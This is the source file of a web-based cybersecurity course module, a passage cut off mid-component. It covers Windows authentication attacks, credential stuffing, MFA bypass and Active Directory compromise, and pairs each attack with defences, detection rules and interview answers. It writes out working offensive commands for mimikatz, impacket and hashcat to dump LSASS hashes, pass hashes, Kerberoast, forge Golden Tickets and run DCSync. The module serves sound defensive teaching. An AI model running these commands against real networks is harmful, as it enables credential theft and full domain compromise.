import { LearnLayout } from '@/components/content/LearnLayout'
import { KeyTakeaways } from '@/components/content/KeyTakeaways'
import { Callout } from '@/components/content/Callout'
import Link from 'next/link'

const C = '#ff4757'

const s = {
  p: { fontSize: 15, color: 'var(--text)', lineHeight: 1.9, marginBottom: 16 } as React.CSSProperties,
  h: { fontSize: 20, fontWeight: 700, color: 'var(--heading)', marginTop: 36, marginBottom: 12 } as React.CSSProperties,
  hl: { color: C, fontWeight: 600 } as React.CSSProperties,
  block: {
    background: 'var(--code-bg)', border: '1px solid var(--border)',
    borderRadius: 8, padding: '16px 20px', fontFamily: 'monospace',
    fontSize: 13, lineHeight: 1.8, marginBottom: 20, whiteSpace: 'pre-wrap' as const,
    overflowX: 'auto' as const,
  },
  table: { width: '100%', borderCollapse: 'collapse' as const, marginBottom: 24, fontSize: 14 },
  th: { background: 'var(--code-bg)', padding: '10px 14px', textAlign: 'left' as const, fontWeight: 600, borderBottom: '2px solid var(--border)' },
  td: { padding: '10px 14px', borderBottom: '1px solid var(--border)', verticalAlign: 'top' as const },
  divider: { border: 'none', borderTop: '1px solid var(--border)', margin: '40px 0' },
  iqBox: { background: 'var(--code-bg)', borderLeft: `4px solid ${C}`, borderRadius: 6, padding: '16px 20px', marginBottom: 20 },
  errBox: { background: '#1a0a0a', borderLeft: '4px solid #ff4757', borderRadius: 6, padding: '16px 20px', marginBottom: 20 },
}

function Part({ children }: { children: React.ReactNode }) {
  return <div style={{ marginBottom: 48 }}>{children}</div>
}

function H({ children }: { children: React.ReactNode }) {
  return <h2 style={s.h}>{children}</h2>
}

function P({ children }: { children: React.ReactNode }) {
  return <p style={s.p}>{children}</p>
}

function Hl({ children }: { children: React.ReactNode }) {
  return <span style={s.hl}>{children}</span>
}

function HR() {
  return <hr style={s.divider} />
}

function Block({ children }: { children: React.ReactNode }) {
  return <pre style={s.block}>{children}</pre>
}

function IQ({ q, children }: { q: string; children: React.ReactNode }) {
  return (
    <div style={s.iqBox}>
      <div style={{ fontWeight: 700, color: C, marginBottom: 8 }}>Q: {q}</div>
      <div style={{ fontSize: 14, color: 'var(--text)', lineHeight: 1.8 }}>{children}</div>
    </div>
  )
}

function Err({ title, cause, fix }: { title: string; cause: string; fix: string }) {
  return (
    <div style={s.errBox}>
      <div style={{ color: '#ff4757', fontWeight: 700, marginBottom: 6 }}>✗ {title}</div>
      <div style={{ fontSize: 13, color: '#ccc', marginBottom: 4 }}><strong>Why it happens:</strong> {cause}</div>
      <div style={{ fontSize: 13, color: '#ccc' }}><strong>Fix:</strong> {fix}</div>
    </div>
  )
}

function ProTip({ children }: { children: React.ReactNode }) {
  return (
    <div style={{ background: '#0a1a0a', borderLeft: '4px solid #2ed573', borderRadius: 6, padding: '14px 18px', marginBottom: 20, fontSize: 14, color: '#ccc', lineHeight: 1.8 }}>
      <strong style={{ color: '#2ed573' }}>Pro tip:</strong> {children}
    </div>
  )
}

export default function Module12() {
  return (
    <LearnLayout
      title="Authentication Attacks — Credential Theft, Pass-the-Hash, Kerberoasting"
      description="How attackers steal and abuse credentials without ever cracking passwords — Pass-the-Hash, Kerberoasting, credential stuffing, and token theft."
      section="Cybersecurity — Module 12"
      readTime="43 min"
      updatedAt="May 2026"
    >
      <Part>
        <P>
          Most enterprise breaches don't involve cracking passwords. They involve stealing the authentication material itself — the hash, the ticket, the token — and reusing it. The attacker never needs to know the actual password if they can authenticate <Hl>as the password</Hl>. This is the insight behind Pass-the-Hash, Pass-the-Ticket, and token theft: authentication protocols were designed to prove you know the secret, but implementation details often allow you to prove it without actually knowing it.
        </P>
        <P>
          This module covers the full spectrum of authentication attacks: how Windows NTLM and Kerberos authentication works and where each is exploitable, how credential stuffing turns breach databases into access, how MFA can be bypassed, and what defences work at the protocol level versus the policy level. By the end, you'll understand why Active Directory environments are so hard to defend once an attacker has a foothold.
        </P>
      </Part>

      <HR />

      <Part>
        <H>How Windows Authentication Works — NTLM and Kerberos</H>
        <P>
          Windows environments use two authentication protocols: <Hl>NTLM</Hl> (older, challenge-response based) and <Hl>Kerberos</Hl> (ticket-based, used by default in Active Directory). Understanding both is essential because most Windows credential attacks exploit specific weaknesses in these protocols.
        </P>
        <Block>{`NTLM Authentication (challenge-response):

Client wants to authenticate to Server:

1. Client → Server: NEGOTIATE_MESSAGE (I want to authenticate)
2. Server → Client: CHALLENGE_MESSAGE (here's an 8-byte random challenge)
3. Client → Server: AUTHENTICATE_MESSAGE
   Contains: NT_HASH(challenge) = NTLM response

   NT hash = MD4(UTF-16LE(password))
   NTLM response = HMAC-MD5(NT_hash, challenge || client_challenge)

Key property: The SERVER never sees the password.
              It knows the stored NT hash and the challenge.
              It computes the expected response and compares.

Attack surface:
  - The NT hash IS the authentication credential — steal hash = steal identity
  - NT hash is stored in:
    - Windows SAM database (local accounts)
    - Active Directory NTDS.dit (domain accounts)
    - LSASS process memory (cached for SSO)
  - Hash doesn't expire when password changes on remote systems
    (until the password is changed on that specific system)`}</Block>
        <Block>{`Kerberos Authentication (ticket-based):

Components:
  KDC (Key Distribution Center) = Domain Controller
  TGT (Ticket Granting Ticket) = proves identity to KDC
  TGS (Ticket Granting Service ticket) = access token for specific service

Authentication flow:
1. Client → KDC (AS-REQ): "I'm Alice, give me a TGT"
   Contains: encrypted timestamp (proves liveness, encrypted with Alice's key)

2. KDC → Client (AS-REP): TGT encrypted with KDC's secret key
   + session key encrypted with Alice's key
   Client caches TGT (valid 10 hours by default)

3. Client → KDC (TGS-REQ): "I have a TGT, give me access to FILE-SERVER"
   Contains: TGT + authenticator

4. KDC → Client (TGS-REP): Service ticket (TGS) encrypted with FILE-SERVER's secret key
   Client cannot read this ticket — it's for FILE-SERVER

5. Client → FILE-SERVER (AP-REQ): "Here's your ticket"
   FILE-SERVER decrypts with its own key, verifies, grants access

Attack surfaces:
  AS-REP Roasting: Accounts with "Do not require Kerberos pre-authentication"
                   KDC will return TGT without verifying identity first
                   Attacker can request TGT for any such account
                   TGT is encrypted with user's key → offline crack the password

  Kerberoasting:   Any authenticated user can request service tickets for any
                   registered service account (SPN)
                   Service ticket encrypted with service account's NTLM hash
                   Attacker requests ticket → offline crack service account password

  Pass-the-Ticket: Steal TGT or TGS from memory → use it directly
                   No password cracking needed
                   Golden Ticket: Forge TGT using KRBTGT hash (Domain Admin access forever)`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Pass-the-Hash — Authenticating Without the Password</H>
        <P>
          <Hl>Pass-the-Hash (PtH)</Hl> exploits the NTLM challenge-response protocol. Since NTLM authenticates using the hash of the password (not the password itself), an attacker who steals the NTLM hash can authenticate to any system that accepts NTLM — without ever cracking or knowing the plaintext password.
        </P>
        <Block>{`Pass-the-Hash attack workflow:

Step 1: Gain initial foothold (e.g., phishing, exploit)
        Access to one workstation as local admin

Step 2: Dump NTLM hashes from LSASS memory (requires admin/SYSTEM)
        # Using mimikatz (in authorised lab context):
        privilege::debug          # enable SeDebugPrivilege
        sekurlsa::logonpasswords  # dump credentials from LSASS

        Output:
          Username: jsmith
          Domain:   CORP
          NTLM:     aad3b435b51404eeaad3b435b51404ee:8f3b7d5c...

        Format: LM_hash:NT_hash
        LM hash is aad3... = "empty LM hash" (disabled)
        NT hash: 8f3b7d5c... = MD4(UTF-16LE("Password123"))

Step 3: Use NT hash directly for authentication
        # impacket's psexec (no need to know password):
        psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f3b7d5c... \\
                  CORP/jsmith@192.168.1.50

        # wmiexec.py for WMI-based execution:
        wmiexec.py -hashes :8f3b7d5c... CORP/jsmith@192.168.1.50

        → Shell on 192.168.1.50 as jsmith without knowing password

Step 4: If jsmith is a Domain Admin, now have domain-wide access
        Dump all hashes from Domain Controller: NTDS.dit
        Extract KRBTGT hash → create Golden Ticket
        Complete domain compromise`}</Block>
        <P>
          The systemic problem is that in many Windows environments, <Hl>local administrator accounts share the same password</Hl> across all workstations (because they were all imaged from the same template). If you compromise one workstation's local admin hash, you can Pass-the-Hash to every other workstation in the domain. This is how a single phishing victim leads to 10,000 compromised endpoints.
        </P>
        <Block>{`Defences against Pass-the-Hash:

Microsoft LAPS (Local Administrator Password Solution):
  - Rotates local admin password on each machine separately
  - Passwords stored in Active Directory, viewable only by authorised admins
  - Breaking LAPS: compromise one machine → lateral movement blocked
    (each machine has different local admin password)

Protected Users security group:
  - Kerberos-only authentication — NTLM disabled for these users
  - No NTLM response possible → PtH fails for these accounts
  - Credentials NOT cached in LSASS
  - Put all privileged accounts (Domain Admins) in this group

Credential Guard (Windows 10/11 Enterprise):
  - LSASS credentials stored in Hyper-V isolated VM (VSM)
  - Mimikatz-style dumps fail: LSASS memory no longer contains plaintext creds
  - NT hashes NOT accessible from Ring 0 anymore

  sekurlsa::logonpasswords output with Credential Guard:
    Authentication Id: 0 ; 2500343 (00000000:002624f7)
    NTLM     : (null)  ← Protected, cannot dump

Network authentication restrictions:
  - Deny access to this computer from the network (local admin accounts)
  - Group Policy: RestrictNTLMInDomain
  - Tiered administration: Domain Admins never log into workstations`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Kerberoasting — Cracking Service Account Passwords Offline</H>
        <P>
          <Hl>Kerberoasting</Hl> exploits how Kerberos service tickets are encrypted. When any authenticated domain user requests a Kerberos service ticket for a service, the KDC encrypts that ticket with the <Hl>NTLM hash of the service account</Hl>. This is by design — the service needs to decrypt the ticket to authenticate the client. But it means anyone in the domain can obtain a blob of data encrypted with any service account's hash, which they can take offline and crack.
        </P>
        <Block>{`Kerberoasting attack:

Prerequisites: Any valid domain user account (even low-privileged)

Step 1: Find service accounts with SPNs (Service Principal Names)
        # PowerShell:
        Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties *

        # Or with impacket:
        GetUserSPNs.py CORP.LOCAL/lowpriv_user:Password123 -dc-ip 192.168.1.10

        Output:
          ServicePrincipalName        Name         MemberOf      PasswordLastSet
          MSSQLSvc/sqlserver.corp:1433 svc_mssql   Domain Admins  2021-03-15
          HTTP/iis.corp               svc_iis      (none)         2022-01-10

Step 2: Request service tickets (any user can do this — it's normal Kerberos)
        GetUserSPNs.py CORP.LOCAL/lowpriv_user:Password123 \\
                       -dc-ip 192.168.1.10 -request -outputfile hashes.txt

        Output in hashes.txt:
          $krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/sqlserver.corp:1433*$a4b2c3...

Step 3: Offline crack the service ticket hash
        hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

        $krb5tgs$23$... → cracked: "Summer2021!"

        23 = RC4 (weaker) — prefer to request RC4 over AES tickets for faster cracking
        18 = AES256 (stronger, slower to crack)

Why this works:
  - Service accounts often have passwords set years ago and never rotated
  - Set by administrators who reuse weak patterns (ServiceName2019!)
  - Service accounts often have Domain Admin membership (legacy AD designs)
  - No detection needed for requesting tickets — it's normal Kerberos activity`}</Block>
        <Block>{`Defences against Kerberoasting:

Strong service account passwords (primary defence):
  - 25+ character random passwords for all service accounts
  - hashcat can crack 8-char passwords in hours; 25-char random = infeasible
  - Rotate every 90 days
  - Use Group Managed Service Accounts (gMSA):
    AD manages 240-character rotating password automatically
    No human knows the password — cannot be guessed
    AD rotates every 30 days — cracked hash is stale before usable

Least privilege for service accounts:
  - Service accounts should NOT be Domain Admins
  - Common finding: svc_backup has Domain Admin "for convenience"
  - If Kerberoasted → game over for entire domain

AES encryption enforcement:
  - Require AES for Kerberos tickets (Group Policy)
  - RC4 (RC4-HMAC) is orders of magnitude faster to crack
  - AES-256 tickets: months longer to crack same password

Detection:
  - Alert on: Many TGS requests for service accounts in short period
  - SIEM rule: >10 Kerberos service ticket requests by one user in 10 minutes
  - Honeypot SPN: Create fake service account with SPN, no legitimate use
    Any request for this ticket = Kerberoasting detected`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Golden Ticket and Silver Ticket — Forging Kerberos Tickets</H>
        <P>
          <Hl>Golden Ticket</Hl> is the highest-privilege persistence mechanism in Active Directory. By extracting the KRBTGT account's hash from a Domain Controller, an attacker can forge any Kerberos TGT for any user in the domain — including non-existent users — with any group membership, for any validity period. This is the closest thing to "I own the domain forever."
        </P>
        <Block>{`Golden Ticket attack:

Prerequisite: KRBTGT hash (requires Domain Admin or DCSync rights)

Extract KRBTGT hash:
  # DCSync — pull hashes from DC without touching the DC disk
  lsadump::dcsync /domain:CORP.LOCAL /user:KRBTGT

  Output:
    Hash NTLM: 5f3b7d5c2e8f1a4c...  ← KRBTGT hash

Forge a Golden Ticket:
  # Any username (even fake), any group (Domain Admins), any expiry
  kerberos::golden /user:FakeAdmin /domain:CORP.LOCAL \\
    /sid:S-1-5-21-1234567890-... /krbtgt:5f3b7d5c2e8f1a4c... \\
    /groups:512 /ptt

  /ptt = pass-the-ticket (inject directly into session)
  /groups:512 = Domain Admins group RID

Impact:
  - Authenticates as any user to any service in the domain
  - Default validity: 10 years (Microsoft recommends TGTs expire in 10 hours)
  - Persists ACROSS password resets — the KRBTGT hash is what matters
  - Persists even if the forged user account is deleted

Removing a Golden Ticket:
  Reset KRBTGT password TWICE (each reset invalidates all existing TGTs)
  Resetting once isn't enough — old TGTs use the previous hash, which is
  cached. Second reset ensures the previous hash is also invalidated.
  Between resets: wait for max TGT lifetime (10 hours by default)

Silver Ticket (less powerful, harder to detect):
  Forged TGS for a SPECIFIC service (not domain-wide)
  Uses service account's hash (not KRBTGT)
  Never touches KDC → no Kerberos event logs generated on DC
  Use: access one specific server without detection on DC`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Credential Stuffing — Turning Breach Databases into Access</H>
        <P>
          <Hl>Credential stuffing</Hl> is the automated testing of username/password pairs from breach databases against other services. When a service like LinkedIn, Adobe, or Dropbox is breached and password hashes are cracked, attackers compile the plaintext username:password pairs and test them against every other major service. Because people reuse passwords, a significant percentage succeed.
        </P>
        <Block>{`Credential stuffing at scale:

Source material:
  - HaveIBeenPwned.com indexes 12+ billion credential pairs from breaches
  - "Combo lists" sold on dark web forums: email:password format
  - Example: LinkedIn 2012 breach → 117M pairs eventually cracked
    Many still valid because users never changed passwords

Attack infrastructure:
  - Automated tools: Sentry MBA, STORM, Vertex, custom Python scripts
  - Residential proxy networks (thousands of IPs to avoid rate limiting)
  - CAPTCHA solving services ($1 per 1000 CAPTCHAs)
  - Account checker lists: Spotify checker, Netflix checker (test one service)

Scale:
  - Typical stuffing campaign: 10-50M credential pairs tested
  - Success rate: 0.1-2% (1K-100K valid logins per campaign)
  - Cost to run: $50-200 (proxy fees + CAPTCHA solving)
  - Revenue: Sell valid accounts or use for fraud/access

Detection signals:
  - Login attempts from many different IPs
  - Known-bad IPs (residential proxies, Tor exit nodes, cloud VMs)
  - High failure rate from specific IP ranges
  - Unusual geographic login patterns (Chicago user → suddenly Singapore)
  - Login velocity: 1000 attempts in 10 minutes on same account

Defence:
  - Leaked password detection: Check new passwords against HaveIBeenPwned API
    Microsoft, Google, GitHub all do this on new password sets
  - Rate limiting + lockout (balance: lockout enables account lockout DoS)
  - MFA: Even valid password + valid username blocked by TOTP/push
  - Anomalous login alerts: New country, new device → challenge user`}</Block>
        <Block>{`# HaveIBeenPwned API integration (defence for your service)
# Check if a password appears in known breach databases
# Uses k-anonymity: sends only first 5 chars of SHA-1 hash

import hashlib
import requests

def is_password_pwned(password: str) -> int:
    """Returns count of breach appearances (0 = not seen)"""
    sha1 = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]

    response = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")

    for line in response.text.splitlines():
        hash_suffix, count = line.split(':')
        if hash_suffix == suffix:
            return int(count)
    return 0

# Usage at registration/password change:
count = is_password_pwned("Password123")
if count > 0:
    return error(f"This password appeared {count} times in data breaches. Choose another.")`}</Block>
      </Part>

      <HR />

      <Part>
        <H>MFA Bypass Techniques</H>
        <P>
          Multi-factor authentication significantly raises the bar for attackers, but it does not make accounts uncompromisable. Different MFA implementations have different vulnerabilities, and sophisticated attackers have adapted.
        </P>
        <table style={s.table}>
          <thead>
            <tr>
              <th style={s.th}>MFA Type</th>
              <th style={s.th}>Attack Method</th>
              <th style={s.th}>How It Works</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['TOTP (Google Authenticator)', 'AiTM phishing proxy', 'Attacker proxies login in real-time — captures session cookie after TOTP entered'],
              ['SMS OTP', 'SIM swapping', 'Attacker social-engineers mobile carrier to port victim\'s number to attacker\'s SIM'],
              ['Push notifications', 'MFA fatigue / prompt bombing', 'Send 50+ push requests until user approves to make them stop'],
              ['Email OTP', 'Account takeover → email compromise', 'If email account is compromised, OTP codes sent there are visible to attacker'],
              ['TOTP', 'TOTP interception (no AiTM)', 'Attacker needs TOTP seed (QR code or TOTP secret from account setup)'],
              ['Any TOTP/SMS', 'Real-time phishing (manual relay)', 'Victim enters code on phishing page, attacker immediately types it on real site'],
            ].map(([mfa, atk, how]) => (
              <tr key={mfa}>
                <td style={{ ...s.td, color: C, fontWeight: 600 }}>{mfa}</td>
                <td style={s.td}>{atk}</td>
                <td style={s.td}>{how}</td>
              </tr>
            ))}
          </tbody>
        </table>
        <Block>{`AiTM (Adversary-in-the-Middle) phishing — bypassing TOTP:

Traditional phishing captures password → blocked by MFA
AiTM phishing captures the session cookie → bypasses MFA entirely

Infrastructure:
  - Attacker runs transparent reverse proxy (EvilGinx2, Modlishka)
  - Victim sees attacker's domain (e.g., m1crosoft.com) with valid TLS cert
  - Proxy forwards all requests to real Microsoft, relays responses back

Attack flow:
  1. Victim clicks phishing link → lands on EvilGinx proxy
  2. Victim enters username → proxied to real Microsoft
  3. Microsoft sends MFA prompt → proxied back to victim
  4. Victim enters TOTP code → proxied to Microsoft
  5. Microsoft accepts → sends session cookie to proxy
  6. Proxy captures session cookie before forwarding to victim
  7. Victim is logged in (doesn't notice anything wrong)
  8. Attacker imports stolen session cookie → authenticated as victim
     MFA already passed — attacker has full access

Defence: Phishing-resistant MFA (FIDO2/WebAuthn/Passkeys)
  - Key bound to a specific domain (origin binding)
  - Passkey for microsoft.com ONLY works on microsoft.com
  - If attacker proxies to m1crosoft.com: passkey refuses to sign
    because origin doesn't match
  - AiTM proxy cannot fake the origin at the hardware level
  - FIDO2 is the ONLY MFA type that defeats AiTM phishing`}</Block>
        <Block>{`MFA Fatigue Attack:

  Concept: Flood user with push notifications until they approve out of frustration

  Tool: Microsoft Authenticator, Duo, Okta Verify all send push notifications

  Attack:
    attacker has valid username + password (from breach/phishing)
    attacker attempts login repeatedly: triggers push notification each time
    sends 50+ notifications over hours/days
    user approves to make them stop, or approves by accident

  Real incident: Uber breach (September 2022)
    - Attacker obtained contractor's credentials from dark web
    - Sent repeated Duo MFA push requests
    - Contacted victim on WhatsApp claiming to be "Uber IT"
    - Said approving was required to stop the notifications
    - Victim approved → attacker gained initial access → full domain compromise
    - Attack cost: ~$20 for credentials, social engineering, time

  Defence:
    - Number matching: App shows a number, user must type matching number
      (defeats accidental approvals and inattentive approvals)
    - Limit push requests: Block after 3 declined pushes in 10 minutes
    - Require additional context: Show location, application for each push
    - Use FIDO2 instead: Phishing-resistant, no push notifications to bomb`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Password Spraying — Attacking Without Lockout</H>
        <P>
          Traditional brute force attacks try many passwords against one account. <Hl>Password spraying</Hl> inverts this: try one or a few common passwords against many accounts. Most organisations lock accounts after 5-10 failed attempts. By trying "Spring2024!" against 500 accounts once each, an attacker gets zero lockouts and statistically hits several valid accounts.
        </P>
        <Block>{`Password spraying logic:

Corporate password policy typically:
  - Lockout after 5 failed attempts
  - 30-minute lockout window

Spray strategy:
  - Try one password per account per 30-minute window
  - Never trigger lockout on any single account
  - 500 accounts × 1 attempt = 0 lockouts
  - Success rate: 1-2% with seasonal/corporate passwords

High-value target passwords to spray:
  CompanyName2024!     (company name + year + !)
  Welcome1             (default setup password, many companies)
  Summer2024!          (seasonal pattern)
  Spring2024           (seasonal)
  Monday1              (day of week, users forced to change)
  Password1            (minimal complexity requirement)
  [Company name][year] (most common pattern at most companies)

Detection:
  - Single source IP hitting many accounts → obvious
  - Using residential proxies: One attempt per IP → harder to detect
  - Detection: Look for accounts getting exactly 1-3 failed logins from
    many different sources — signature of coordinated spray

Defence:
  - Smart lockout: Consider IP, location, device in lockout decisions
  - Leaked password blocking (HaveIBeenPwned API)
  - Prohibit seasonal/company-name patterns in password policy
  - Entra ID (Azure AD) Password Protection: Blocks banned passwords
    + custom banned list per tenant
  - Conditional Access: Require MFA for all logins regardless`}</Block>
      </Part>

      <HR />

      <Part>
        <H>DCSync — Pulling the Entire AD Database</H>
        <P>
          <Hl>DCSync</Hl> is a technique that abuses Active Directory replication protocols to extract password hashes for any account — including all users, KRBTGT, and machine accounts — without requiring physical access to or code execution on a Domain Controller.
        </P>
        <Block>{`DCSync attack:

Background: Domain Controllers replicate changes to each other via
            MS-DRSR (Directory Replication Service Remote Protocol)
            Any DC can request credential data from another DC

Abused permission: "Replicating Directory Changes" + "Replicating Directory Changes All"
                   Normally only DCs have these permissions
                   If an attacker has these permissions on an account...

Attack (requires admin-level access or specific delegated rights):
  # With mimikatz:
  lsadump::dcsync /domain:CORP.LOCAL /user:Administrator
  lsadump::dcsync /domain:CORP.LOCAL /all /csv  ← dump ALL hashes

  # With impacket (remote, no code on DC needed):
  secretsdump.py CORP.LOCAL/jsmith:Password123@192.168.1.10

  Output:
    Administrator:500:aad3b435b51404ee:8f3b7d5c2e8f1a4c:::
    KRBTGT:502:aad3b435b51404ee:5f3b7d5c2e8f1a4c:::
    jsmith:1107:aad3b435b51404ee:a2c4b6d8e0f1a3c5:::
    ... (all domain accounts)

With these hashes, an attacker can:
  - Pass-the-Hash as any user including Domain Admin
  - Use KRBTGT hash to create Golden Tickets
  - Crack hashes offline to reveal plaintext passwords

Detection:
  - Event ID 4662: Directory Service Access (replication events)
  - Event ID 4624 + 4672: Logon with replication privileges from non-DC source
  - Alert: Any account with replication rights that is not a Domain Controller
    performing replication requests`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Workplace Scenario — Active Directory Compromise Chain</H>
        <P>
          A manufacturing firm's IR team investigates a breach. The attackers entered through a phishing email and achieved domain admin status in 72 hours without triggering any alerts until the final step.
        </P>
        <Block>{`Attack timeline reconstruction:

Day 1, 09:15 — Initial access
  Phishing email to HR department: "Job Application - Resume.docx"
  Macro-enabled document runs PowerShell → Cobalt Strike beacon
  Beacon calls out to HTTPS C2 over port 443 → blends with web traffic

Day 1, 14:30 — Local enumeration
  whoami /groups     → standard domain user
  net localgroup administrators  → check local admin
  ipconfig /all      → identify subnet, DNS

Day 1, 16:00 — Credential harvesting from LSASS
  Another user (IT helpdesk) recently logged into this workstation
  sekurlsa::logonpasswords → captured IT helpdesk's NTLM hash

Day 2, 09:00 — Lateral movement with PtH
  psexec -hashes :helpdesk_hash CORP/helpdesk@192.168.1.80
  → Shell on helpdesk workstation
  helpdesk had local admin on all workstations (IT support role)

Day 2, 11:00 — Kerberoasting
  GetUserSPNs.py CORP.LOCAL/helpdesk:... -request
  → Retrieved TGS for svc_backup (has Domain Admin!)
  hashcat → cracked "Backup2019!" in 4 hours

Day 2, 15:00 — Domain Admin via service account
  Now have Domain Admin credentials (svc_backup)

Day 2, 15:30 — DCSync
  secretsdump.py CORP.LOCAL/svc_backup:Backup2019!@dc01
  → All domain hashes extracted including KRBTGT

Day 3, 02:00 — Golden Ticket installed, ransomware deployed

Mistakes that enabled this:
  1. IT helpdesk logged into user workstation (credential exposure)
  2. helpdesk had local admin on ALL workstations (over-privilege)
  3. svc_backup was Domain Admin "for convenience"
  4. svc_backup had weak, never-rotated password
  5. No alerting on Kerberoasting, DCSync, or LSASS access`}</Block>
      </Part>

      <HR />

      <Part>
        <H>Interview Questions</H>

        <IQ q="Explain Pass-the-Hash. Why doesn't changing the user's password fix it?">
          Pass-the-Hash exploits NTLM's challenge-response design. NTLM authentication works by the server sending a random challenge, and the client responding with a hash of that challenge encrypted with their NT hash (the MD4 hash of their password). Since the server verifies by computing the expected response using the stored NT hash, an attacker who steals the NT hash can compute the correct NTLM response without ever knowing the plaintext password.
          <br /><br />
          Changing the user's password on their primary account updates the NT hash in Active Directory and on the primary machine — so PtH using the old hash no longer works for domain authentication. However, the fix is incomplete in several scenarios. If the user was logged into other systems (servers, workstations) before the password change, those systems may have stale cached credentials. More critically, if an attacker obtained the hash and used it to pivot to other systems, they may have created new persistence (Golden Ticket, new admin accounts) that doesn't depend on the original user's hash. This is why the correct incident response isn't just changing one user's password — it's investigating the full blast radius of what the attacker did with the stolen credentials.
        </IQ>

        <IQ q="What is Kerberoasting and why does it work against service accounts specifically?">
          Kerberoasting exploits a property of Kerberos service ticket encryption. When a domain user requests a service ticket for a service that has a Service Principal Name (SPN), the KDC (Domain Controller) encrypts the ticket using the NT hash of the service account that owns the SPN. This is by design — the service needs to decrypt the ticket to verify the requesting user's identity. Crucially, any authenticated domain user can request service tickets for any registered SPN.
          <br /><br />
          The attack: an attacker with any low-privileged domain account requests service tickets for all SPNs (which is legitimate Kerberos behavior, generating no alerts). Each returned ticket is encrypted with the corresponding service account's NT hash. The attacker takes these encrypted ticket blobs offline and runs hashcat against them — if the service account password is weak (common because IT set it five years ago to "ServiceName2019!"), it cracks quickly.
          <br /><br />
          Service accounts are particularly vulnerable because they often have passwords set once and never rotated, use simple patterns that humans can remember (they may need to be manually re-entered), and are frequently granted excessive privilege (Domain Admin "for convenience"). The defence is Group Managed Service Accounts (gMSA), which have 240-character random passwords rotated by AD automatically — a cracked Kerberoasting hash is useless because the password changed before the crack completed.
        </IQ>

        <IQ q="How does an AiTM phishing attack bypass TOTP-based MFA? What's the only MFA type that defeats it?">
          AiTM (Adversary-in-the-Middle) uses a transparent reverse proxy between the victim and the legitimate service. When the victim visits the phishing page, every action is relayed in real-time to the real site. The victim enters their username — relayed to the real site. The real site sends an MFA challenge — relayed to the victim. The victim enters their TOTP code — relayed to the real site. The real site authenticates successfully and issues a session cookie — the proxy intercepts this cookie before forwarding it to the victim. The victim gets logged in normally and sees no indication of compromise. The attacker now has a valid, post-MFA session cookie they can import into their own browser.
          <br /><br />
          TOTP codes are time-limited but the AiTM relay happens in under a second, so the code is valid at the real site. MFA was successfully completed by the real user — the session cookie just went to the wrong place.
          <br /><br />
          The only MFA type that defeats AiTM is FIDO2/WebAuthn (passkeys). FIDO2 authentication is cryptographically bound to the origin — the specific domain the authentication request came from. The signing key used to authenticate is only valid for the exact registered origin (e.g., accounts.google.com). If an AiTM proxy intercepts the FIDO2 authentication request and forwards it, the browser's WebAuthn implementation checks the origin — it's the phishing domain, not the real domain — and refuses to sign. No signature means no authentication. The origin binding is enforced at the hardware/browser level, which the proxy cannot fake.
        </IQ>

        <IQ q="What is a Golden Ticket attack and how do you remove it after discovery?">
          A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) created using the KRBTGT account's NT hash. KRBTGT is a special account whose hash the KDC uses to encrypt and sign all TGTs. With the KRBTGT hash, an attacker can forge a TGT for any user, with any group membership, for any validity period (including 10 years), and no Domain Controller needs to be contacted — the service trusts the TGT because it's validly signed.
          <br /><br />
          Detection is difficult because the forged TGT looks cryptographically valid. Indicators include: TGTs with anomalously long validity periods, TGTs for non-existent users, logins showing group memberships not in Active Directory (a DC can detect this on ticket use), or logins from unexpected locations for sensitive accounts.
          <br /><br />
          Removal requires resetting the KRBTGT password twice. Each password reset generates a new hash; TGTs signed with the old hash are rejected. However, since TGTs have a 10-hour default lifetime, immediately after the first reset, old TGTs are still valid for up to 10 hours. The procedure is: first reset, wait 10 hours (or the maximum TGT lifetime), second reset. After the second reset, no TGT signed with the original compromised hash can authenticate. You must also identify and address how the KRBTGT hash was obtained in the first place — typically through DCSync or physical DC access — and ensure full IR scope assessment of what else the attacker did.
        </IQ>

        <IQ q="Walk me through how you'd detect a password spraying attack in SIEM logs.">
          Password spraying leaves a distinct pattern that differs from normal failed logins and from traditional brute force. I'd write SIEM detection rules targeting several signals. First, account diversity: look for a single source IP (or small IP range) with failed authentication events against many different accounts in a short time window — for example, 50+ distinct usernames with one failure each from the same IP in 30 minutes. This pattern is the inverse of a brute force (which shows many failures against the same account).
          <br /><br />
          Second, distributed spraying: sophisticated attackers use one attempt per IP per account to avoid the obvious pattern. Look at the reverse: many different source IPs each hitting many accounts for exactly one failed attempt in the same time window. Correlate by failed password value if your logs capture it — many attempts using the same password across different accounts from different IPs is a coordinated spray.
          <br /><br />
          Third, timing analysis: sprays often have regular timing intervals (automated tools send requests at fixed intervals). Look for consistent millisecond-level timing patterns across authentication events.
          <br /><br />
          For Active Directory specifically: Windows Event ID 4625 (failed logon) with Logon Type 3 (network) is the primary indicator. Alert on: any account with 1-3 failures (below lockout threshold) from an IP that hits 100+ accounts in 30 minutes. Also alert on: immediate successful login after multiple failures — a sign the spray found a valid credential.
        </IQ>
      </Part>

      <HR />

      <Part>
        <H>Error Library — Common Mistakes</H>

        <Err
          title="Thinking account lockout prevents credential attacks"
          cause="Lockout policies are designed for brute force but don't stop password spraying (one attempt per account stays below lockout threshold) or Pass-the-Hash (NT hash bypasses password authentication entirely). Also, attackers use lockout policies to perform account lockout DoS — locking out all domain accounts before a ransomware deployment to slow incident response."
          fix="Layer defences: MFA (defeats PtH and stolen credentials), leaked password blocking (defeats credential stuffing), smart lockout with IP and device context (penalises suspicious IPs more aggressively), and FIDO2 (defeats AiTM). Lockout alone is insufficient against modern techniques."
        />

        <Err
          title="Giving service accounts Domain Admin privileges for convenience"
          cause="Backup services, monitoring agents, and automation scripts often need elevated access. IT admins grant Domain Admin because it solves the immediate permission problem. Service accounts then become the highest-value Kerberoasting targets — their SPNs are in AD, their passwords are often old and weak, and cracking them yields full domain compromise."
